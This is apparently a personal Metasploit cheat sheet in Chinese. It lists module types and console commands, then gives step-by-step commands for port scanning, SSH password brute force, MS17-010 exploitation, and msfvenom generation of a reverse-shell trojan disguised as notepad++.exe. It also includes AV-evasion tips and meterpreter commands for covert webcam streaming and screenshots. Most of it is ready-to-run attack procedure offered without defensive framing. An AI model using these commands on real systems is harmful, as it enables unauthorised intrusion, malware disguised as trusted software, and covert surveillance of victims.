MSF 101
```php
auxiliary modules 輔助滲透 端口掃瞄、密碼爆破、漏洞驗證
#show auxiliary 查看可用輔助工具
exploits modules 漏洞利用腳本 rules: os/架構/
#show exploits  查看可用攻擊腳本
payload modules  攻擊後-->執行代碼 revres shell
#show payload 查看適合所有的載荷碼
#show targets 查看適合攻擊目標類型
post modules     攻擊後-->對目標發送功能性指令
encoders modules 編碼工具對payload加密達成 bypass
evasion modules  生成免殺payload
nops modules     被檢查不規則數據如bufferflow特殊字串則會被攔截導致失敗

msfdb init 更新資料
msfconsole 啟動
db_staus   檢查資料庫連線
workspace  當前工作區
search     尋找功能
info       顯示模組詳細內容
use        使用攻擊模組
setg/unstg 設定/禁用所有模組全局參數
save       保存以便下次啟動仍可用

```
portscan
```php
use auxiliary/scanner/portscan/syn
set rhost <ip>
set threads 20
run
```
Metasploit-meterpreter
生成遠端木馬
```php
 msfvenom 鍵盤 鏡頭監控
msfvenom -p <payload> lhost=<kali_ip> lport=<port> -f exe <files> -x notepad++.exe -o notepad++.exe 
<payload>= OS windows/架構x64/作用meterpreter/方式reverse_tcp
use exploit/multi/handler
set payload <>
set lhost <>
set lport <>
run
bypass AV 加密檔 壓縮檔 包起來
```
弱口令檢查爆破
```php
### msf auxiliary/scanner/
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <ip>
set USER_FILE /path/dic_username_ssh.txt
set PASS_FILE /path/pwd100.txt
run
```

```php
smb port 445
use auxiliary/scanner/smb/smb_m17_010
show options 缺什麼補什麼
set rhosts <ip>
run

use exploit/windows/smb/ms17_010_psexec
set rhosts <ip>
set threads 10
run
background   // background session 1....
or
sessions    //show active sessions list
sessions -u id  //session轉換成meterpreter
use exploit/windows/smb/ms17_010_

webcam_stream //開啟鏡頭
screenshare  //分享桌面
screenshot   //桌面快照 --> save /root/path
getuid       //當下權限
ps           //現狀執行套件





```
